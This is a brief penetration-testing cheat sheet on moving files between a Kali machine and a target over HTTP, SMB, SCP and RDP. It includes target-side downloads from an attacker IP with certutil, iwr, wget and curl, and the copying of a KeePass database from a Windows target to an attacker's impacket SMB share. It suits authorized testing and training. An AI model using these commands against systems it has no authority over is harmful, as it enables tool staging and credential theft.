
## Webserver (Kali => Target)

Start webserver:
```bash
python3 -m http.server <port>
```

On Windows:
```bash
# Powershell
iwr -uri http://<IP>/<file> -OutFile <file>

# CMD
certutil.exe -urlcache -f http://<IP>/<file> <file>
```

On Linux:
```bash
wget http://<IP>/<file> -O /tmp/<file>
curl http://<IP>/<file> --output /tmp/<file>
```


## SMB (Kali <=> Target)

Start the SMB server on Linux:
```bash
mkdir /tmp/smb
sudo impacket-smbserver files /tmp/smb -smb2support -user admin -password admin -port 445
```

On the Windows box:
```bash
powershell

$pass = ConvertTo-SecureString 'admin' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('admin', $pass)
New-PSDrive -Name "files" -PSProvider "FileSystem" -Root "\\192.168.45.161\files" -Credential $cred
```

Transfer files:
```bash
# On Windows
copy Database.kdbx files:

# Check in linux:
ls /tmp/smb
```


## SSH (Kali <=> Target)

If SCP is available we can start the SSH server to allow for file transfer:
```bash
# Start SSH server on Kali
sudo systemctl start ssh

# Kali => Target
scp kali@<kali-IP>:/tmp/transferthis .

# Kali <= Target
scp transferthis kali@<kali-IP>:/tmp/
```


## RDP (Kali <=> Target)

Share folder:
```bash
xfreerdp /v:<ip_address> /u:<username> /p:<password> +clipboard /drive:/path/to/local/folder,ShareName
```
